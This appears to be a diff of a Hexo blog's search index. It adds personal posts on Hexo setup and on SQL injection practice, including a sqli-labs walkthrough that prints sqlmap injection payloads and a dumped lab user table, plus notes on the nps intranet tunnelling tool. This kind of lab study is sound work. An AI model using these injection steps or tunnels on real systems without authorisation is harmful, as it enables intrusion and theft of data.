-<p><img src="https://i.loli.net/2020/09/24/d9RinLJajIDeK4Q.png" alt="image-20200924002714899"></p>
-<p><img src="https://i.loli.net/2020/09/24/ZBHY98yvrCqLcwl.png" alt="image-20200924002806679"></p>
-<p><img src="https://i.loli.net/2020/09/24/FwqbnW58hvVDNYO.png" alt="image-20200924002840066"></p>
-<p><img src="https://i.loli.net/2020/09/24/DtkOPyTwixWbL49.png" alt="image-20200924002906183"></p>
-<p><img src="https://i.loli.net/2020/09/24/dNJeQHOWiEZI5Us.png" alt="image-20200924002937647"></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>nps</tag>
-        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -320,6 +166,136 @@
       </tags>
   </entry>
   <entry>
+    <title>hexo quick start</title>
+    <url>/2021/01/18/hexo%20quick%20start/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
+<h2 id="Hexo-Quick-Start"><a href="#Hexo-Quick-Start" class="headerlink" title="Hexo Quick Start"></a>Hexo Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="Next-theme-setting"><a href="#Next-theme-setting" class="headerlink" title="Next theme setting"></a>Next theme setting</h2><h3 id="1-Install-next-through-curl"><a href="#1-Install-next-through-curl" class="headerlink" title="1.Install next through curl"></a>1.Install next through curl</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir themes&#x2F;next</span><br><span class="line">$ curl -s https:&#x2F;&#x2F;api.github.com&#x2F;repos&#x2F;iissnan&#x2F;hexo-theme-next&#x2F;releases&#x2F;latest | grep tarball_url | cut -d &#39;&quot;&#39; -f 4 | wget -i - -O- | tar -zx -C themes&#x2F;next --strip-components&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Update-the-next-theme"><a href="#2-Update-the-next-theme" class="headerlink" title="2.Update the next theme"></a>2.Update the next theme</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd themes&#x2F;next</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-Edit-the-config-yml-and-change-to-next-theme"><a href="#3-Edit-the-config-yml-and-change-to-next-theme" class="headerlink" title="3.Edit the _config.yml,and change to next theme"></a>3.Edit the _config.yml,and change to next theme</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## Themes: https:&#x2F;&#x2F;hexo.io&#x2F;themes&#x2F;</span><br><span class="line">#theme: landscape</span><br><span class="line">theme: next</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Next-has-four-style"><a href="#4-Next-has-four-style" class="headerlink" title="4.Next has four style"></a>4.Next has four style</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse  &#x2F;&#x2F;默认主题</span><br><span class="line">#scheme: Mist</span><br><span class="line">#scheme: Pisces</span><br><span class="line">#scheme: Gemini</span><br></pre></td></tr></table></figure>
+
+<h2 id="Menu-setting"><a href="#Menu-setting" class="headerlink" title="Menu setting"></a>Menu setting</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># When running the site in a subdirectory (e.g. domain.tld&#x2F;blog), remove the leading slash (&#x2F;archives -&gt; archives)</span><br><span class="line"># the sequense</span><br><span class="line">menu:</span><br><span class="line">  home: &#x2F;</span><br><span class="line">  categories: &#x2F;categories&#x2F;</span><br><span class="line">  archives: &#x2F;archives&#x2F;</span><br><span class="line">  tags: &#x2F;tags&#x2F;</span><br><span class="line">  about: &#x2F;about&#x2F;</span><br><span class="line">  #sitemap: &#x2F;sitemap.xml</span><br><span class="line">  #commonweal: &#x2F;404&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Tags-setting"><a href="#Tags-setting" class="headerlink" title="Tags setting"></a>Tags setting</h3><h4 id="add-tags"><a href="#add-tags" class="headerlink" title="add tags"></a>add tags</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># add tags</span><br><span class="line">$ hexo new page &quot;tags&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="edit-index-md"><a href="#edit-index-md" class="headerlink" title="edit index.md"></a>edit index.md</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: All tags</span><br><span class="line">date: 2018-01-20 18:57:48</span><br><span class="line">type: &quot;tags&quot;    #this is need to add.</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h3 id="other-Menu-options-is-the-same-to-tags"><a href="#other-Menu-options-is-the-same-to-tags" class="headerlink" title="other Menu options is the same to tags"></a>other Menu options is the same to tags</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  such as categories、about。after add categories (hexo new page &quot;categories&quot;)，创建的文件内容填写如下</span><br><span class="line">---</span><br><span class="line">title: All categories</span><br><span class="line">date: 2018-01-20 18:57:48</span><br><span class="line">type: &quot;categories&quot;## this is need to add</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h2 id="add-search-in-the-site"><a href="#add-search-in-the-site" class="headerlink" title="add search in the site"></a>add search in the site</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br><span class="line">$ npm install hexo-generator-searchdb --save</span><br><span class="line"></span><br><span class="line">#edit _config.yml</span><br><span class="line"># Local search</span><br><span class="line"># Dependencies: https:&#x2F;&#x2F;github.com&#x2F;flashlab&#x2F;hexo-generator-search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  # if auto, trigger search by changing input</span><br><span class="line">  # if manual, trigger search by pressing enter key or search button</span><br><span class="line">  trigger: auto</span><br><span class="line">  # show top n results per article, show all results by setting to -1</span><br><span class="line">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>hexo use</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>others</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab notes not the same</title>
+    <url>/2020/09/22/sqli-lab-notes-less5/</url>
+    <content><![CDATA[<h2 id="sqli-labs-less5"><a href="#sqli-labs-less5" class="headerlink" title="sqli-labs-less5"></a>sqli-labs-less5</h2><h3 id="find-a-vulnerable-point"><a href="#find-a-vulnerable-point" class="headerlink" title="find a vulnerable point."></a>find a vulnerable point.</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET parameter &#39;id&#39; is vulnerable. Do you want to keep testing the others (if any)? [y&#x2F;N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 9046&#x3D;9046 AND &#39;rjhe&#39;&#x3D;&#39;rjhe</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 3356 FROM(SELECT COUNT(*),CONCAT(0x716b7a7871,(SELECT (ELT(3356&#x3D;3356,1))),0x71626b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#39;OjIE&#39;&#x3D;&#39;OjIE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 8875 FROM (SELECT(SLEEP(5)))zVCV) AND &#39;RNxr&#39;&#x3D;&#39;RNxr</span><br><span class="line">---</span><br><span class="line">[17:17:08] [INFO] the back-end DBMS is MySQL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="find-dbs"><a href="#find-dbs" class="headerlink" title="find dbs"></a>find dbs</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:18:40] [INFO] fetching database names</span><br><span class="line">[17:18:42] [INFO] retrieved: &#39;information_schema&#39;</span><br><span class="line">[17:18:43] [INFO] retrieved: &#39;challenges&#39;</span><br><span class="line">[17:18:44] [INFO] retrieved: &#39;mysql&#39;</span><br><span class="line">[17:18:45] [INFO] retrieved: &#39;performance_schema&#39;</span><br><span class="line">[17:18:46] [INFO] retrieved: &#39;security&#39;</span><br><span class="line">available databases [5]:</span><br><span class="line">[*] challenges</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] security</span><br></pre></td></tr></table></figure>
+
+<h3 id="find-tables"><a href="#find-tables" class="headerlink" title="find tables"></a>find tables</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 -D security --tables</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:19:55] [INFO] fetching tables for database: &#39;security&#39;</span><br><span class="line">[17:19:57] [INFO] retrieved: &#39;emails&#39;</span><br><span class="line">[17:19:58] [INFO] retrieved: &#39;referers&#39;</span><br><span class="line">[17:19:59] [INFO] retrieved: &#39;uagents&#39;</span><br><span class="line">[17:20:00] [INFO] retrieved: &#39;users&#39;</span><br><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="find-columns"><a href="#find-columns" class="headerlink" title="find columns"></a>find columns</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 -D security -T users --columns</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:21:00] [INFO] fetching columns for table &#39;users&#39; in database &#39;security&#39;</span><br><span class="line">[17:21:03] [INFO] retrieved: &#39;id&#39;</span><br><span class="line">[17:21:04] [INFO] retrieved: &#39;int(3)&#39;</span><br><span class="line">[17:21:05] [INFO] retrieved: &#39;username&#39;</span><br><span class="line">[17:21:06] [INFO] retrieved: &#39;varchar(20)&#39;</span><br><span class="line">[17:21:07] [INFO] retrieved: &#39;password&#39;</span><br><span class="line">[17:21:08] [INFO] retrieved: &#39;varchar(20)&#39;</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure>
+
+<h3 id="get-data"><a href="#get-data" class="headerlink" title="get data"></a>get data</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.140.147&#x2F;sqli-labs&#x2F;Less-5&#x2F;\?id\&#x3D;1 -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17:22:25] [INFO] fetching entries of column(s) &#39;id, password, username&#39; for table &#39;users&#39; in database &#39;security&#39;</span><br><span class="line">[17:22:31] [INFO] retrieved: &#39;1&#39;</span><br><span class="line">[17:22:32] [INFO] retrieved: &#39;Dumb&#39;</span><br><span class="line">[17:22:33] [INFO] retrieved: &#39;Dumb&#39;</span><br><span class="line">[17:22:34] [INFO] retrieved: &#39;2&#39;</span><br><span class="line">[17:22:35] [INFO] retrieved: &#39;I-kill-you&#39;</span><br><span class="line">[17:22:36] [INFO] retrieved: &#39;Angelina&#39;</span><br><span class="line">[17:22:37] [INFO] retrieved: &#39;3&#39;</span><br><span class="line">[17:22:38] [INFO] retrieved: &#39;p@ssword&#39;</span><br><span class="line">[17:22:39] [INFO] retrieved: &#39;Dummy&#39;</span><br><span class="line">[17:22:40] [INFO] retrieved: &#39;4&#39;</span><br><span class="line">[17:22:42] [INFO] retrieved: &#39;crappy&#39;</span><br><span class="line">[17:22:43] [INFO] retrieved: &#39;secure&#39;</span><br><span class="line">[17:22:44] [INFO] retrieved: &#39;5&#39;</span><br><span class="line">[17:22:45] [INFO] retrieved: &#39;stupidity&#39;</span><br><span class="line">[17:22:46] [INFO] retrieved: &#39;stupid&#39;</span><br><span class="line">[17:22:47] [INFO] retrieved: &#39;6&#39;</span><br><span class="line">[17:22:48] [INFO] retrieved: &#39;genious&#39;</span><br><span class="line">[17:22:49] [INFO] retrieved: &#39;superman&#39;</span><br><span class="line">[17:22:50] [INFO] retrieved: &#39;7&#39;</span><br><span class="line">[17:22:51] [INFO] retrieved: &#39;mob!le&#39;</span><br><span class="line">[17:22:52] [INFO] retrieved: &#39;batman&#39;</span><br><span class="line">[17:22:53] [INFO] retrieved: &#39;8&#39;</span><br><span class="line">[17:22:55] [INFO] retrieved: &#39;admin&#39;</span><br><span class="line">[17:22:56] [INFO] retrieved: &#39;admin&#39;</span><br><span class="line">[17:22:57] [INFO] retrieved: &#39;9&#39;</span><br><span class="line">[17:22:58] [INFO] retrieved: &#39;admin1&#39;</span><br><span class="line">[17:22:59] [INFO] retrieved: &#39;admin1&#39;</span><br><span class="line">[17:23:00] [INFO] retrieved: &#39;10&#39;</span><br><span class="line">[17:23:01] [INFO] retrieved: &#39;admin2&#39;</span><br><span class="line">[17:23:02] [INFO] retrieved: &#39;admin2&#39;</span><br><span class="line">[17:23:03] [INFO] retrieved: &#39;11&#39;</span><br><span class="line">[17:23:04] [INFO] retrieved: &#39;admin3&#39;</span><br><span class="line">[17:23:05] [INFO] retrieved: &#39;admin3&#39;</span><br><span class="line">[17:23:07] [INFO] retrieved: &#39;12&#39;</span><br><span class="line">[17:23:08] [INFO] retrieved: &#39;dumbo&#39;</span><br><span class="line">[17:23:09] [INFO] retrieved: &#39;dhakkan&#39;</span><br><span class="line">[17:23:10] [INFO] retrieved: &#39;14&#39;</span><br><span class="line">[17:23:11] [INFO] retrieved: &#39;admin4&#39;</span><br><span class="line">[17:23:12] [INFO] retrieved: &#39;admin4&#39;</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[13 entries]</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| id | password   | username |</span><br><span class="line">+----+------------+----------+</span><br><span class="line">| 1  | Dumb       | Dumb     |</span><br><span class="line">| 2  | I-kill-you | Angelina |</span><br><span class="line">| 3  | p@ssword   | Dummy    |</span><br><span class="line">| 4  | crappy     | secure   |</span><br><span class="line">| 5  | stupidity  | stupid   |</span><br><span class="line">| 6  | genious    | superman |</span><br><span class="line">| 7  | mob!le     | batman   |</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+
+<p>over.</p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql_injection</tag>
+        <tag>sqli_labs</tag>
+        <tag>sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-关于url中井号的理解</title>
+    <url>/2021/01/18/sql%E6%B3%A8%E5%85%A5-%E5%85%B3%E4%BA%8Eurl%E4%B8%AD%E4%BA%95%E5%8F%B7%E7%9A%84%E7%90%86%E8%A7%A3/</url>
+    <content><![CDATA[<p>关于url and #的理解</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello World!&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;GET&quot;&gt;</span><br><span class="line">			&lt;p&gt;</span><br><span class="line">				User ID:</span><br><span class="line">				&lt;input type&#x3D;&quot;text&quot; size&#x3D;&quot;15&quot; name&#x3D;&quot;id&quot;&gt;</span><br><span class="line">				&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;Submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">			&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if ($_GET[&quot;id&quot;])</span><br><span class="line">    echo &quot;Hello World!&quot;.&quot;id is &quot;.$_GET[&quot;id&quot;];</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>#，提交到当前页面</p>
+<p>_GET可以取出提交的值。</p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql_injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入-判断是字符型还是整型</title>
+    <url>/2021/01/18/sql%E6%B3%A8%E5%85%A5-%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B4%E5%9E%8B/</url>
+    <content><![CDATA[<p>?id=1 and 1=2</p>
+<p>来自百度：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;zhidao.baidu.com&#x2F;question&#x2F;1952853439075012508.html</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>总结这个问题如下：<br>SELECT uname,email FROM userinfo WHERE id = ‘1 and 1=3’ ;<br>这句SQL是可以查询到结果的,当然前提是有id=1的数据。<br>其实，1后面的字符可以是任意的，不会影响查询，它甚至可以是：<br>SELECT uname,email FROM userinfo WHERE id = ‘1dsasasdasasd’ ;<br>那么为什么会这样呢？<br>经过测试，我发现这是因为id的类型为数值型,例如int，而查询的时候传入的是字符串，而MYSQL是十分智能的，它会进行类型转换，但是这个转换过程是很随意的，就像varchar 的’2asdasd’会被转成int的 2。<br>当然，如果id本身就是varchar类型的，那么数据库查询的时候就会进行精准的匹配，这样子’2adsdasd’等类似的数据由于数据库里没有匹配项,查询结果为空。</p>
+</blockquote>
+<hr>
+<p>卧槽是正确的</p>
+<p>分析：</p>
+<p>假设id在数据库的类型是数值型如int。</p>
+<p><img src="https://i.loli.net/2021/01/14/COMHfYWKqTRimDn.png" alt="image-20210114143843875"></p>
+<p>上图可得出，传给id的是一个字符串，数据库会进行一个转换，id=’1’转换为id=1</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.sqli-labs.com&#x2F;Less-1&#x2F;?id&#x3D;1dsasasdasasd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/14/f8y6but93clasXF.png" alt="image-20210114144015677"></p>
+<p>上图可得出，传给id的是一个字符串，数据库会进行一个转换，id=’1dsasasdasasd’转换为id=1</p>
+<p>原理同上，验证正确。</p>
+<p>综上，假设正确，id为int型。进源代码查看如下：正确。</p>
+<p><img src="https://i.loli.net/2021/01/14/mqc1yu8w9VZGDRU.png" alt="image-20200907233834055"></p>
+<hr>
+<p>分析如下：</p>
+<blockquote>
+<p>经过测试，我发现这是因为id的类型为数值型,例如int，而查询的时候传入的是字符串，而MYSQL是十分智能的，它会进行类型转换，但是这个转换过程是很随意的，就像varchar 的’2asdasd’会被转成int的 2。<br>当然，如果id本身就是varchar类型的，那么数据库查询的时候就会进行精准的匹配，这样子’2adsdasd’等类似的数据由于数据库里没有匹配项,查询结果为空。</p>
+</blockquote>
+<p>牛逼，应该是这样。</p>
+]]></content>
+      <categories>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>sql_injection</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>王小波的话</title>
     <url>/2021/01/16/wangxiaobo/</url>
     <content><![CDATA[<blockquote class="blockquote-center">人的一切痛苦，本质上都是对自己的无能的愤怒。</blockquote>
@@ -337,6 +313,44 @@
 ]]></content>
       <tags>
         <tag>literature</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网穿透-nps-notes</title>
+    <url>/2020/09/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-nps-notes/</url>
+    <content><![CDATA[<p>nps notes</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2021-01-13</span><br><span class="line">参考：</span><br><span class="line">来着github</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps&#x2F;blob&#x2F;master&#x2F;README_zh.md</span><br><span class="line"></span><br><span class="line">来自哔哩哔哩</span><br><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV12E411B7Ns?from&#x3D;search&amp;seid&#x3D;15898087636535266347</span><br><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1b7411D7Fw?from&#x3D;search&amp;seid&#x3D;6562851621532130301</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">做微信公众号开发、小程序开发等----&gt; 域名代理模式</span><br><span class="line"></span><br><span class="line">想在外网通过ssh连接内网的机器，做云服务器到内网服务器端口的映射，----&gt; tcp代理模式</span><br><span class="line"></span><br><span class="line">在非内网环境下使用内网dns，或者需要通过udp访问内网机器等----&gt; udp代理模式</span><br><span class="line"></span><br><span class="line">在外网使用HTTP代理访问内网站点----&gt; http代理模式</span><br><span class="line"></span><br><span class="line">搭建一个内网穿透ss，在外网如同使用内网vpn一样访问内网资源或者设备----&gt; socks5代理模式</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理...</span><br><span class="line">全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务</span><br><span class="line">控制全面，同时支持服务端和客户端控制</span><br><span class="line">https集成，支持将后端代理和web服务转成https，同时支持多证书</span><br><span class="line">操作简单，只需简单的配置即可在web ui上完成其余操作</span><br><span class="line">展示信息全面，流量、系统信息、即时带宽、客户端版本等</span><br><span class="line">扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等）</span><br><span class="line">域名解析具备自定义header、404页面配置、host修改、站点保护、URL路由、泛解析等功能</span><br><span class="line">服务端支持多用户和用户注册功能</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">快速开始</span><br><span class="line">安装</span><br><span class="line">releases</span><br><span class="line">下载对应的系统版本即可，服务端和客户端是单独的</span><br><span class="line"></span><br><span class="line">服务端启动</span><br><span class="line">下载完服务器压缩包后，解压，然后进入解压后的文件夹</span><br><span class="line"></span><br><span class="line">执行安装命令</span><br><span class="line">对于linux|darwin sudo .&#x2F;nps install</span><br><span class="line"></span><br><span class="line">对于windows，管理员身份运行cmd，进入安装目录 nps.exe install</span><br><span class="line"></span><br><span class="line">默认端口</span><br><span class="line">nps默认配置文件使用了80，443，8080，8024端口</span><br><span class="line"></span><br><span class="line">80与443端口为域名解析模式默认端口</span><br><span class="line"></span><br><span class="line">8080为web管理访问端口</span><br><span class="line"></span><br><span class="line">8024为网桥端口，用于客户端与服务器通信</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line">对于linux|darwin sudo nps start</span><br><span class="line"></span><br><span class="line">对于windows，管理员身份运行cmd，进入程序目录 nps.exe start</span><br><span class="line"></span><br><span class="line">安装后windows配置文件位于 C:\Program Files\nps，linux和darwin位于&#x2F;etc&#x2F;nps</span><br><span class="line"></span><br><span class="line">如果发现没有启动成功，可以查看日志(Windows日志文件位于当前运行目录下，linux和darwin位于&#x2F;var&#x2F;log&#x2F;nps.log)</span><br><span class="line"></span><br><span class="line">访问服务端ip:web服务端口（默认为8080）</span><br><span class="line">使用用户名和密码登陆（默认admin&#x2F;123，正式使用一定要更改）</span><br><span class="line">创建客户端</span><br><span class="line">客户端连接</span><br><span class="line">点击web管理中客户端前的+号，复制启动命令</span><br><span class="line">执行启动命令，linux直接执行即可，windows将.&#x2F;npc换成npc.exe用cmd执行</span><br><span class="line">如果需要注册到系统服务可查看注册到系统服务</span><br><span class="line"></span><br><span class="line">配置</span><br><span class="line">客户端连接后，在web中配置对应穿透服务即可</span><br><span class="line">更多高级用法见完整文档</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2020/09/24/sSWeDmLgHAKlJIk.png" alt="image-20200924002317330"></p>
+<p><img src="https://i.loli.net/2020/09/24/Dqrd9VxwZY6AE2W.png" alt="image-20200924002400305"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;npc.exe -server&#x3D;119.2*****.19:8024 -vkey&#x3D;**********4x6bzyc6g09 -type&#x3D;tcp</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://i.loli.net/2020/09/24/WMPYCBDyKz1p7Ev.png" alt="image-20200924002516982"></p>
+<p><img src="https://i.loli.net/2020/09/24/fylNG3jpMLbCiXe.png" alt="image-20200924002635118"></p>
+<p><img src="https://i.loli.net/2020/09/24/d9RinLJajIDeK4Q.png" alt="image-20200924002714899"></p>
+<p><img src="https://i.loli.net/2020/09/24/ZBHY98yvrCqLcwl.png" alt="image-20200924002806679"></p>
+<p><img src="https://i.loli.net/2020/09/24/FwqbnW58hvVDNYO.png" alt="image-20200924002840066"></p>
+<p><img src="https://i.loli.net/2020/09/24/DtkOPyTwixWbL49.png" alt="image-20200924002906183"></p>
+<p><img src="https://i.loli.net/2020/09/24/dNJeQHOWiEZI5Us.png" alt="image-20200924002937647"></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>nps</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
 </search>
